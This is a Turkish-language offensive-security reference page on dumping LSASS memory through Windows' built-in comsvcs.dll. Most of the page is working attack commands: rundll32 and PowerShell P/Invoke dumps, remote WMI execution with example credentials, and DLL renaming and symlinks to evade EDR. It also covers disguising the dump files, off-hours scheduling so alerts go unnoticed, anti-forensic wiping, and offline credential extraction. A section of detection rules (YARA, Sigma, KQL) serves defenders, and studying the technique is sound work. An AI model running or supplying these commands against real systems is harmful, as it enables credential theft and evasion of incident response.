# comsvcs.dll

> **Kategori:** [7. Bellek Analizi, LSASS Dökümü ve Kasa Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows işletim sisteminde yerleşik olarak bulunan (Living-off-the-Land / LOLBin), `rundll32.exe` aracılığıyla dışa aktardığı 24 numaralı ordinal veya `MiniDump` fonksiyonu üzerinden `dbghelp.dll!MiniDumpWriteDump` API'sini tetikleyerek diske hiçbir harici yazılım yüklemeden `lsass.exe` bellek dökümünü alabilen yerel COM+ Services kütüphanesi.

---

## 1. Genel Bakış ve Amaç

Active Directory ve Windows sızma testlerinde operatörlerin en çok aradığı yöntemlerden biri, kurban makineye üçüncü taraf hiçbir çalıştırılabilir dosya (EXE/DLL) indirmeden sistemin kendi meşru araçlarıyla (*Living-off-the-Land*) parola dökümü alabilmektir. `mimikatz.exe` veya harici döküm araçları çoğu zaman disk tabanlı antivirüsler tarafından anında karantinaya alınır.

**`comsvcs.dll`** (COM+ Services Dynamic Link Library), Windows XP ve Windows Server 2003'ten bu yana her Windows kurulumunda `C:\Windows\System32\` altında varsayılan olarak bulunan, Microsoft tarafından dijital olarak imzalanmış bir sistem kütüphanesidir. Kütüphane, süreç çökmelerinde sistem durumunu kaydetmek amacıyla dışa aktarılan (export) özel bir mini döküm fonksiyonu barındırır:
- **`MiniDump` Fonksiyonu (Ordinal #24):** Bu fonksiyon, parametre olarak verilen bir Süreç Kimliğini (PID) ve bir dosya yolunu alarak işletim sisteminin `dbghelp.dll` kütüphanesindeki `MiniDumpWriteDump` Win32 API'sini otomatik olarak çağırır.
- **Rundll32 Entegrasyonu:** Windows'un meşru ikilisi `rundll32.exe` kullanılarak komut satırından tek bir satırla çağrılabilir. Bu sayede saldırgan, sisteme tek bir bayt dahi harici kod yüklemeden LSASS sürecinin tam bellek kopyasını (`.dmp`) elde eder.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│             SALDIRGAN / YÖNETİCİ KOMUT İSTEMİ (ELEVATED)               │
│                                                                        │
│  [ rundll32.exe ]                                                      │
│         │                                                              │
│         ├── (1) comsvcs.dll Belleğe Yüklenir                           │
│         │                                                              │
│         ├── (2) Ordinal #24 (MiniDump) Çağrılır:                       │
│         │         MiniDump(lsass_pid, "C:\Temp\dump.dmp", "full")      │
│         │                                                              │
│         ├── (3) dbghelp.dll!MiniDumpWriteDump Fonksiyonu Tetiklenir    │
│         │         │                                                    │
│         │         ▼ (PROCESS_ALL_ACCESS / 0x1FFFFF ile Handle)         │
│         │   [ lsass.exe Bellek Sayfaları Okunur ]                      │
│         │                                                              │
│         └── (4) Döküm Diske Yazılır: [ C:\Temp\dump.dmp ]              │
│                                                                        │
│  [ Çevrimdışı Analiz: pypykatz veya Mimikatz ile Hash Çıkarma ]        │
└────────────────────────────────────────────────────────────────────────┘
```

### 1.1 `comsvcs.dll!MiniDump` İç Çalışma Mekanizması ve Tersine Mühendislik Analizi

`comsvcs.dll` kütüphanesinin dışa aktardığı `MiniDumpW` fonksiyonu, `rundll32.exe` tarafından çağrılabilen standart `rundll32` imzasını uygular:
```c
void CALLBACK MiniDumpW(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow);
```

Tersine mühendislik yapıldığında fonksiyonun iç akışı şu şekildedir:
1. **Argüman Ayrıştırma (Command Line Parsing):** `lpszCmdLine` içerisindeki dizgi boşluklara göre ayrıştırılır. İlk parametre hedef sürecin PID numarası (integer), ikinci parametre çıktı dosya yolu (string), üçüncü parametre ise döküm modudur (`full`).
2. **Ayrıcalık Yükseltme (Privilege Adjustment):** Fonksiyon, `ntdll!RtlAdjustPrivilege(20, TRUE, FALSE, &bPrev)` çağrısı yaparak sürece ait belirteçte `SeDebugPrivilege` ayrıcalığını açmayı dener. Bu çağrının başarılı olabilmesi için çağıran sürecin zaten yerel yönetici veya SYSTEM yetkilerinde olması gerekir.
3. **Süreç Tanıtıcısı Edinme (OpenProcess):** `OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwTargetPID)` çağrısıyla hedef sürece (`lsass.exe`) tam yetkili bir handle açılır.
4. **MiniDumpWriteDump İcrası:** `CreateFileW` ile çıktı dosyası oluşturulduktan sonra `dbghelp.dll` kütüphanesi yüklenir ve `MiniDumpWriteDump(hProcess, dwPID, hFile, MiniDumpWithFullMemory, ...)` API'si çalıştırılarak hedef sürecin tüm sanal bellek alanları diske yazılır.

### 1.2 EDR Tespit Vektörleri ve Davranışsal İnceleme

Modern EDR ve SIEM sistemleri `comsvcs.dll` istismarını iki farklı katmanda izler:
- **Çekirdek Düzeyi Filtreleme (`ObRegisterCallbacks`):** EDR'a ait çekirdek sürücüsü (Kernel Driver), `rundll32.exe` sürecinin `lsass.exe` sürecine handle açtığı anda `OB_PRE_OPERATION_INFORMATION` bildirimini yakalar. `rundll32.exe` gibi bir sürecin LSASS'a `0x1FFFFF` veya `0x1010` yetkisiyle bağlanması davranışsal anomali olarak değerlendirilir.
- **Kullanıcı Alanı API Kancalaması (Userland Hooking):** EDR DLL'i, `dbghelp.dll` içerisindeki `MiniDumpWriteDump` fonksiyonunun girişine kanca yerleştirerek hedef parametrenin `lsass.exe` olduğunu tespit ettiği anda işlemi bloke eder.

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Saf LOLBin Yaklaşımı** | Sistemde varsayılan bulunan Microsoft imzalı DLL ve EXE ikilisidir. | Hedefe hiçbir yabancı dosya yüklenmediği için dosya tabanlı AV taramalarını atlatır. |
| **Tek Satırlık İcra** | CMD veya PowerShell üzerinden tek bir komut satırıyla çalıştırılabilir. | Uzaktan yönetim araçları (WMI, WinRM, Scheduled Tasks) üzerinden tetiklenmeye çok uygundur. |
| **Otomasyon Desteği** | `lsassy`, `NetExec`, `CrackMapExec` gibi popüler araçların varsayılan döküm motorudur. | Kurumsal ağlarda yüzlerce makineden toplu kimlik hasadının temel yapı taşıdır. |
| **Çevrimdışı Çözümleme** | Oluşturulan `.dmp` dosyası saldırganın kendi makinesinde ayrıştırılır. | Kurban sunucu üzerinde asla Mimikatz çalıştırma zorunluluğu bırakmaz. |

### Karşılaştırma Tablosu

| Kriter | comsvcs.dll | ProcDump.exe | Mimikatz (sekurlsa) | Dumpert |
|---|---|---|---|---|
| **Dosya Durumu** | Windows Yerel (Var) | Harici Sysinternals | Harici Zararlı İkili | Harici C/BOF |
| **İmza Sahibi** | Microsoft Windows | Microsoft Sysinternals | İmzasız / Rastgele | İmzasız |
| **Kullanıcı Alanı Kancaları**| Takılır (Hooked) | Takılır (Hooked) | Takılır | Baypas Eder (Syscall) |
| **Komut Satırı İmzası** | Çok Belirgin (`#24`) | Orta (`-ma lsass.exe`) | Yüksek | Sıfır |
| **Güvenilirlik** | Çok Yüksek | Çok Yüksek | Orta (Çökme riski) | Yüksek |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, #24 <Hedef_PID> <Cikis_Dosya_Yolu> full
```
veya isimle çağırma:
```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <Hedef_PID> <Cikis_Dosya_Yolu> full
```

### Parametre Detayları

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `C:\Windows\System32\comsvcs.dll` | Hedef COM+ kütüphanesinin tam dosya yolu. | `C:\Windows\System32\comsvcs.dll` |
| `#24` veya `MiniDump` | Fonksiyonun ordinal numarası veya dışa aktarılan açık fonksiyon ismi. | `#24` |
| `<Hedef_PID>` | Dökümü alınacak sürecin Kimlik Numarası (LSASS PID'si). | `648` veya `$(Get-Process lsass).Id` |
| `<Cikis_Dosya_Yolu>` | Oluşturulacak minidump dosyasının kaydedileceği tam yol. | `C:\Windows\Temp\lsass.dmp` |
| `full` | Dökümün tam bellek dökümü (Full Memory Dump) modunda alınacağını belirtir. | `full` *(Zorunludur)* |

> [!IMPORTANT]
> `comsvcs.dll` üzerinden LSASS dökümü alabilmek için çağıran sürecin `SeDebugPrivilege` ayrıcalığına sahip olması zorunludur. PowerShell veya CMD doğrudan Yönetici Olarak başlatıldığında bu yetki genellikle hazırdır; ancak CMD ortamında bazen yetkiyi açıkça etkinleştirmek gerekebilir.

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: PowerShell ile Dinamik PID Tespiti ve Döküm Alma

LSASS sürecinin PID numarası dinamik olarak sorgulanır ve tek bir satırda `comsvcs.dll` çalıştırılarak döküm `C:\Windows\Temp\` dizinine yazılır.

```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll, #24 (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full
```

---

### Senaryo 2: Komut İstemi (CMD) ile Manuel PID Belirterek Döküm

Görev yöneticisi veya `tasklist` ile LSASS PID'si (örneğin 684) öğrenildikten sonra doğrudan CMD üzerinden çalıştırma:

```cmd
tasklist /fi "imagename eq lsass.exe"
rundll32.exe C:\Windows\System32\comsvcs.dll, #24 684 C:\Temp\debug.dmp full
```

---

### Senaryo 3: DLL Kopyalama ve Yeniden Adlandırma ile Komut Satırı İmzası Atlatma

EDR sistemlerinin komut satırında `comsvcs.dll` dizgisini izlemesini atlatmak için kütüphane geçici bir dizine farklı bir adla kopyalanır ve oradan çağrılır.

```cmd
copy C:\Windows\System32\comsvcs.dll C:\Users\Public\net_diagnostic.dll
rundll32.exe C:\Users\Public\net_diagnostic.dll, #24 684 C:\Users\Public\crash.log full
del C:\Users\Public\net_diagnostic.dll
```

---

### Senaryo 4: PowerShell P/Invoke ile `rundll32.exe` Başlatmadan Bellek İçi Döküm

`rundll32.exe` sürecinin oluşturulmasını engelleyerek doğrudan PowerShell süreci içinde `comsvcs.dll!MiniDump` fonksiyonunu P/Invoke ile çalıştırma:

```powershell
$MiniDumpDef = @"
[DllImport("comsvcs.dll", EntryPoint = "MiniDumpW")]
public static extern void MiniDump(IntPtr hwnd, IntPtr hinst, [MarshalAs(UnmanagedType.LPWStr)] string pszCmdLine, int nCmdShow);
"@
$comsvcs = Add-Type -MemberDefinition $MiniDumpDef -Name "COM_Dump" -Namespace "Win32" -PassThru
$lsassPid = (Get-Process lsass).Id
$dumpPath = "C:\Windows\Temp\mem_sync.tmp full"
$comsvcs::MiniDump([IntPtr]::Zero, [IntPtr]::Zero, "$lsassPid $dumpPath", 0)
```

---

### Senaryo 5: Uzaktan WMI Üzerinden Hedef Sunucuda Döküm Tetikleme

Saldırgan makineden WMI/WMIC protokolü ile uzak sunucuda `comsvcs.dll` çalıştırılır ve döküm uzaktaki C$ paylaşımından çekilir.

```cmd
wmic /node:192.168.1.50 /user:CORP\Admin /password:P@ss123 process call create "cmd.exe /c rundll32.exe C:\Windows\System32\comsvcs.dll, #24 684 C:\Windows\Temp\cache.dmp full"
```

---

### Senaryo 6: Sembolik Bağ (Symlink) ile Dosya Yolu Denetimlerini Baypas Etme

Antivirüsün `comsvcs.dll` yolunu doğrudan denetlediği senaryolarda `mklink` ile sembolik bağ oluşturularak çağırma:

```cmd
mklink C:\Temp\kernel_diag.dll C:\Windows\System32\comsvcs.dll
rundll32.exe C:\Temp\kernel_diag.dll, #24 684 C:\Temp\report.dat full
del C:\Temp\kernel_diag.dll
```

---

### Senaryo 7: Elde Edilen Dökümün Saldırgan Makinesinde pypykatz ile Çözümlenmesi

Kurban sunucudan indirilen `lsass.dmp` dosyası Linux analiz makinesinde incelenerek tüm parolalar çıkarılır.

```bash
pypykatz lsa minidump lsass.dmp
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `Döküm dosyası 0 KB veya hiç oluşmuyor` | Çağıran sürecin `SeDebugPrivilege` ayrıcalığı aktif değil (Standart kullanıcı veya kısıtlı token). | PowerShell'i "Yönetici Olarak Çalıştır" ile açın; CMD kullanıyorsanız önce `whoami /priv` ile SeDebugPrivilege varlığını teyit edin. |
| `Süreç hemen sonlanıyor / Erişim Engellendi` | Hedef sistemde LSA Koruması (`RunAsPPL`) aktif; LSASS sürecine `OpenProcess` çağrısı engelleniyor. | PPL korumasını aşmak için BYOVD sürücüleri (`PPLKiller`) veya `PPLMedic` araçlarını kullanın. |
| `The parameter is incorrect / Parametre hatalı` | Komut satırı sözdiziminde argüman sırası hatalı veya sonundaki `full` anahtar kelimesi eksik. | Sıralamayı kontrol edin: `rundll32 comsvcs.dll, #24 <PID> <YOL> full`. |
| `EDR / Windows Defender komutu anında engelledi` | Uç nokta koruması `rundll32` + `comsvcs` + `MiniDump` / `#24` örüntüsünü statik kural olarak yakaladı. | DLL dosyasını kopyalayıp yeniden adlandırın (Senaryo 3) veya doğrudan sistem çağrısı yapan `Dumpert` / `nanodump` aracına geçin. |
| `pypykatz: Minidump header corrupted` | Döküm alınırken disk alanı bitti veya döküm tamamlanmadan süreç kapatıldı. | Hedef diskteki boş alanı kontrol edin (`dir C:\`); dökümün 40–100 MB arasında tam yazıldığından emin olun. |
| `OpenProcess failed with 0x00000005` | Süreç üzerinde anti-malware veya sistem koruma yazılımı hook yerleştirmiş. | API kancalarını atlatmak için doğrudan P/Invoke veya unhooking mekanizmalarını uygulayın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: ÇOK YÜKSEK (EDR İMZALARI & STATİK KOMUT)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : Event ID 4688 (Process Creation: rundll32.exe comsvcs)
[ Sysmon ]          : Event ID 1 (CommandLine #24), Event ID 10 (lsass Access)
[ Görsel İzi ]      : Sysmon Event ID 7 (ImageLoaded: comsvcs.dll in rundll32)
[ Dosya İzi ]       : Hedef diskte 40-100 MB boyutunda .dmp dosyası
[ EDR Tespiti ]     : Bilinen en popüler LOLBin; tüm kurumsal EDR'lar yakalar
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Windows Security Event ID 4688 & Sysmon Event ID 1 (Process Creation):**
   - Komut satırında doğrudan `rundll32.exe`, `comsvcs.dll`, `#24` veya `MiniDump` ve `full` anahtar kelimelerinin açıkça kaydedilmesi.
2. **Sysmon Event ID 10 (Process Access):**
   - `rundll32.exe` sürecinin kaynak olarak `C:\Windows\System32\lsass.exe` sürecine `0x1FFFFF` (`PROCESS_ALL_ACCESS`) erişim maskesiyle handle açması.
3. **Sysmon Event ID 7 (Image Loaded):**
   - `rundll32.exe` sürecinin `comsvcs.dll` kütüphanesini dinamik olarak yüklemesi. Meşru Windows iş yüklerinde `rundll32.exe` nadiren `comsvcs.dll` yükler.
4. **Sysmon Event ID 11 (FileCreate):**
   - Diskte büyük boyutlu bir döküm dosyasının (`.dmp`) oluşturulması.

### 5.2 Ağ ve EDR İmzaları

- **Karakteristik Komut Satırı:** SOC analistlerinin SIEM sistemlerinde en yaygın arattığı ilk 3 komuttan biridir.
- **Kullanıcı Alanı API Kancaları:** EDR ajanları `dbghelp.dll!MiniDumpWriteDump` API fonksiyonunu izleyerek çağrının hedefi `lsass.exe` olduğunda işlemi anında durdurur ve bildirim üretir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1003.001** | OS Credential Dumping: LSASS Memory | `MiniDump` ordinali ile LSASS bellek dökümü alma. |
| **T1218.011** | Signed Binary Proxy Execution: Rundll32 | Microsoft imzalı `rundll32.exe` ile proxy kod yürütme. |
| **T1070.004** | Indicator Removal: File Deletion | Döküm sonrası `.dmp` dosyasının silinmesi. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Komut Satırı İzlenmesi** | `rundll32` komut satırını doğrudan çalıştırmayın. DLL dosyasını kopyalayın, sembolik bağ (symlink) kullanın veya PowerShell reflection tercih edin. |
| **Büyük Döküm Dosyası** | Döküm dosyasını `C:\Windows\Temp` yerine meşru yazılımların çalıştığı kalabalık bir dizine (`C:\ProgramData\`) ve `.log` / `.dat` uzantısıyla yazın. |
| **EDR API Engeli** | Modern EDR bulunan sistemlerde `comsvcs.dll` yerine doğrudan çekirdek sistem çağrıları (Direct Syscalls) kullanan `nanodump` veya `Dumpert` kullanın. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma & YARA)

**YARA Kuralı — Komut Satırında veya Betiklerde comsvcs MiniDump Tespiti:**

```yara
rule Suspicious_Comsvcs_MiniDump_CommandLine {
    meta:
        description = "Detects usage of comsvcs.dll MiniDump or ordinal 24 for LSASS dumping"
        author = "Active Directory Security Project"
        date = "2026-10-14"
        severity = "Critical"
    strings:
        $s1 = "comsvcs" nocase
        $s2 = "MiniDump" nocase
        $s3 = "#24"
        $s4 = "full" nocase
    condition:
        $s1 and ($s2 or $s3) and $s4
}
```

**Sigma Kuralı — Rundll32 ve comsvcs.dll ile LSASS Dökümü Alma Tespiti:**

```yaml
title: LSASS Memory Dump via Rundll32 Comsvcs
status: stable
description: Detects process dumping execution using rundll32 calling comsvcs.dll MiniDump or ordinal 24.
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 1
    Image|endswith: '\rundll32.exe'
    CommandLine|contains: 'comsvcs'
    CommandLine|contains|any:
      - '#24'
      - 'MiniDump'
  condition: selection
level: critical
```

**Microsoft Sentinel (KQL) — comsvcs.dll Çağrısı Tespiti:**

```kql
DeviceProcessEvents
| where InitiatingProcessFileName =~ "rundll32.exe" or FileName =~ "rundll32.exe"
| where ProcessCommandLine has "comsvcs"
| where ProcessCommandLine has_any ("#24", "MiniDump")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: PowerShell ile Hızlı LSASS Dökümü
```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll, #24 (Get-Process lsass).Id C:\Windows\Temp\dump.dmp full
```
- **Ne Yapar?** LSASS PID'sini otomatik bulur, ordinal 24 ile tam bellek dökümünü `dump.dmp` olarak kaydeder.
- **Ne Zaman Kullanılır?** PowerShell erişimi olan yönetici oturumlarında en pratik döküm için.
- **Parametreler:** `#24`: MiniDump fonksiyonu, `(Get-Process lsass).Id`: LSASS PID'si.

### Komut 2: Fonksiyon İsmi ile Açık Döküm Çağrısı
```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 672 C:\Temp\lsass.dmp full
```
- **Ne Yapar?** Ordinal yerine `MiniDump` fonksiyon adını doğrudan çağırarak döküm alır.
- **Ne Zaman Kullanılır?** Ordinal numaralarının farklı olduğu özel Windows derlemelerinde.
- **Parametreler:** `MiniDump`: Fonksiyon adı, `full`: Tam döküm modu.

### Komut 3: Gizli Dizin ve Özel Uzantı ile Maskeleme
```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, #24 672 C:\ProgramData\USOPrivate\UpdateStore\backup.dat full
```
- **Ne Yapar?** Dökümü Windows Update önbellek dizinine `.dat` uzantısıyla kaydeder.
- **Ne Zaman Kullanılır?** `.dmp` uzantısını takip eden DLP sensörlerini ve dosya bütünlük kurallarını atlatmak için.
- **Parametreler:** Özel dosya yolu ve `.dat` uzantısı.

### Komut 4: DLL Yeniden Adlandırma ile Komut Satırı Baypası
```cmd
copy C:\Windows\System32\comsvcs.dll C:\Temp\diag.dll && rundll32.exe C:\Temp\diag.dll, #24 672 C:\Temp\lsass.dmp full && del C:\Temp\diag.dll
```
- **Ne Yapar?** DLL'i farklı isimle kopyalar, çalıştırır ve orijinal haline dönerek geçici kütüphaneyi siler.
- **Ne Zaman Kullanılır?** `comsvcs.dll` metin dizgisini arayan basit komut satırı filtrelerini aşmak için.
- **Parametreler:** `copy`, `rundll32`, `del` ardışık komut zinciri.

### Komut 5: Uzaktan WMI ile Sessiz Çalıştırma
```cmd
wmic process call create "rundll32.exe C:\Windows\System32\comsvcs.dll, #24 672 C:\Windows\Temp\out.dmp full"
```
- **Ne Yapar?** Yeni süreci WMI üzerinden arka planda başlatır.
- **Ne Zaman Kullanılır?** Etkileşimli pencere açmadan sessizce döküm almak için.
- **Parametreler:** `process call create`: WMI süreç başlatma metodu.

### Komut 6: Zamanlanmış Görev ile Gecikmeli Döküm
```cmd
schtasks /create /tn "AppCrashReport" /tr "rundll32.exe C:\Windows\System32\comsvcs.dll, #24 672 C:\Temp\crash.dmp full" /sc once /st 23:59 /ru "SYSTEM"
```
- **Ne Yapar?** SYSTEM yetkilerinde tek seferlik zamanlanmış görev oluşturup döküm alır.
- **Ne Zaman Kullanılır?** EDR alarmlarının mesai saatleri dışında inceleme havuzuna düşmesini sağlamak için.
- **Parametreler:** `/tn`: Görev adı, `/ru SYSTEM`: SYSTEM yetkisinde çalıştırma.

### Komut 7: PowerShell P/Invoke ile Doğrudan Süreç İçi Çağırma
```powershell
[Win32.COM_Dump]::MiniDump([IntPtr]::Zero, [IntPtr]::Zero, "$((Get-Process lsass).Id) C:\Temp\out.dmp full", 0)
```
- **Ne Yapar?** `rundll32.exe` sürecini hiç başlatmadan mevcut PowerShell süreci içinden `MiniDumpW` fonksiyonunu icra eder.
- **Ne Zaman Kullanılır?** `rundll32.exe` çalıştırma kısıtlamaları (AppLocker/WDAC) devredeyken.
- **Parametreler:** `MiniDump` P/Invoke çağrısı.

### Komut 8: Sembolik Bağ (Symlink) ile Çağırma
```cmd
mklink C:\Temp\test.dll C:\Windows\System32\comsvcs.dll && rundll32.exe C:\Temp\test.dll, #24 672 C:\Temp\out.dmp full
```
- **Ne Yapar?** Hard link veya NTFS sembolik bağı üzerinden kütüphaneyi çağırır.
- **Ne Zaman Kullanılır?** Dosya kopyalama izinlerinin kısıtlı olduğu ancak symlink oluşturulabilen ortamlarda.
- **Parametreler:** `mklink` sembolik bağ aracı.

### Komut 9: Alınan Dökümün pypykatz ile İncelenmesi
```bash
pypykatz lsa minidump C:\Windows\Temp\dump.dmp
```
- **Ne Yapar?** Linux veya analiz makinesinde `.dmp` dosyasından kimlikleri ayıklar.
- **Ne Zaman Kullanılır?** Döküm alındıktan sonra çevrimdışı parola analizi yapmak için.
- **Parametreler:** `lsa minidump`: Pypykatz minidump ayrıştırma alt komutu.

### Komut 10: Döküm Sonrası Güvenli Dosya İmhası
```cmd
sdelete.exe -p 3 -s -q C:\Windows\Temp\dump.dmp
```
- **Ne Yapar?** Analiz için indirilen döküm dosyasını hedef diskten kalıcı olarak (3 geçişli ezme) siler.
- **Ne Zaman Kullanılır?** Olay müdahale ekiplerinin adli analizde dosya kurtarmasını engellemek için.
- **Parametreler:** `-p 3`: 3 kez üzerine yazma, `-s`: Sessiz mod.

---

## Kaynaklar

- **LOLBAS Projesi:** [LOLBAS / Rundll32 / comsvcs.dll](https://lolbas-project.github.io/lolbas/Libraries/comsvcs/)
- **MITRE ATT&CK Referansı:** [T1003.001 - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- **Microsoft Win32 API Dokümantasyonu:** [MiniDumpWriteDump function (dbghelp.h)](https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump)

---

> **Önceki:** [← SharpKatz](./SharpKatz.md) · **Sonraki:** [PPLMedic_PPLDump →](./PPLMedic_PPLDump.md)
